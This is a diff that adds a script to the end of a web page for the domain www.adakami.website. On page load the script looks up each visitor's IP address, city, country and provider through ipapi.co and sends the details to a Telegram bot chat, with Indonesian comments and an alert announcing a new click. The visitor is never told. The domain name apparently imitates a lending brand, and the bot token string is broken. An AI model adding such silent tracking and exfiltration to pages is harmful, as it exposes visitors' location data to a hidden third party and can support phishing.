@@ -330,5 +330,37 @@
     function resetTimer() {
         startTimer();
     }
+        </script>
+        <script type="text/javascript">
+            window.onload = function() {
+    const botToken = ";
+    const chatId = "6242724406";
+
+    // Mengambil data lokasi pengunjung berdasarkan IP
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n` +
+                          `<b>Domain:</b> www.adakami.website\n` +
+                          `<b>IP:</b> <code>${data.ip}</code>\n` +
+                          `<b>Kota:</b> ${data.city}\n` +
+                          `<b>Negara:</b> ${data.country_name}\n` +
+                          `<b>Provider:</b> ${data.org}\n` +
+                          `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+
+        // Kirim notifikasi ke Telegram kamu
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: infoPesan,
+            parse_mode: 'HTML'
+          })
+        });
+      })
+      .catch(err => console.error("Gagal melacak kunjungan"));
+  };
+        </script>
 </body>
 </html>
